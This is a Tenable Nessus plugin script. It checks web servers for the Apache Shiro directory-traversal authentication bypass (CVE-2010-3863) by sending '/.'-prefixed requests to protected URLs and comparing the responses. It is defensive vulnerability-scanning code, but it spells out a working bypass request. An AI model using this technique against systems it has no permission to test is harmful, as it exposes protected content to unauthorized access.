#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(50600);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2016/05/03 19:53:31 $");

  script_cve_id("CVE-2010-3863");
  script_bugtraq_id(44616);
  script_osvdb_id(69067);
  script_xref(name:"EDB-ID", value:"34952");

  script_name(english:"Apache Shiro URI Path Security Directory Traversal Information Disclosure");
  script_summary(english:"Attempts to bypass authentication.");

  script_set_attribute(attribute:"synopsis", value:
"A security framework running on the remote web server is affected by
an information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the Apache Shiro open source security framework running
on the remote web server is affected by an error in the path-based
filter chain mechanism due to a failure to properly normalize URI
paths before comparing them with entries in the shiro.ini file. An
unauthenticated, remote attacker can exploit this, via a crafted
request using directory traversal, to bypass intended access
restrictions, resulting in the disclosure of sensitive information.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/archive/1/514616/100/0/threaded");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Apache Shiro version 1.1.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/11/03");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/11/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/11/15");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:shiro");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);

# Get a list of URLs possibly protected by Shiro.
authc_files = get_kb_list("www/"+port+"/content/30x");
authcbasic_files = get_kb_list("www/"+port+"/content/basic_auth/url/*");

if (isnull(authc_files) && isnull(authcbasic_files))
  exit(0, "The web server on port "+port+" does not appear to have any pages that might be protected by Shiro's authentication filters.");

files = make_list();
if (!isnull(authc_files))
  files = make_list(files, authc_files);
if (!isnull(authcbasic_files))
  files = make_list(files, authcbasic_files);

disable_cookiejar();
max_files = 5;
i = 0;
# Common login patterns to verify we are able to bypass authentication
login_pat = "user((\s)?(name|id))?|pass(word)?|submit|log((\s)?\+(\s)?(in|on)|in|on)|id|email";
vuln = FALSE;
output = '';

foreach url (files)
{
  if (!thorough_tests && i++ >= max_files) break;

  # Try to exploit the vulnerability to bypass authentication.
  # Send our exploit and check response
  url = ereg_replace(pattern:"^(.+?)([?;].*)", replace:"\1", string:url);
  exploit = '/.' + url;

  res = http_send_recv3(
    method : "GET",
    item   : exploit,
    port   : port,
    exit_on_fail : TRUE
  );

  headers = parse_http_headers(status_line:res[0], headers:res[1]);
  if (isnull(headers))
    audit(AUDIT_WEB_NO_SERVER_HEADER, port);

  if (isnull(headers['location']))
    location = "";
  else
    location = headers['location'];

  code = headers['$code'];

  if (code == 302 && exploit+'/' >< location)
  {
    url += '/';
    exploit = '/.' + url;
    res = http_send_recv3(
      method : "GET",
      item   : exploit,
      port   : port,
      exit_on_fail : TRUE
    );
    headers = parse_http_headers(status_line:res[0], headers:res[1]);
    if (isnull(headers))
      audit(AUDIT_WEB_NO_SERVER_HEADER, port);

    code = headers['$code'];
  }

  # Verify that the response before our exploit is not returning the same
  # HTTP status code
  if (code == 200)
  {
    output = strip(res[2]);
    res2 = http_send_recv3(
      method : "GET",
      port   : port,
      item   : url,
      exit_on_fail : TRUE
    );

    if (res2[0] =~ "^HTTP/[0-9.]+ 30[1237]")
    {
      # Appears to be vulnerable. Let's follow the redirect now and verify
      res2 = http_send_recv3(
        method : "GET",
        port   : port,
        item   : url,
        follow_redirect : 3,
        exit_on_fail    : TRUE
      );
      # Lets check for some indication that this is a login page before we
      # report it.
      if (ereg(string:res2[2], icase:TRUE, pattern:login_pat, multiline:TRUE))
        vuln = TRUE;
    }
    # Basic authentication used, and we bypassed it, so flag this case.
    if (
      res2[0] =~ "^HTTP/[0-9.]+ 401" &&
      res2[1] =~ "WWW-Authenticate: Basic"
    ) vuln = TRUE;
  }
  if (vuln) break;
}

if (vuln)
{
  security_report_v4(
    port : port,
    generic : TRUE,
    severity : SECURITY_WARNING,
    request  : make_list(build_url(qs:exploit, port:port)),
    output   : output
  );
  exit(0);
}
else audit(AUDIT_LISTEN_NOT_VULN, "web server", port);
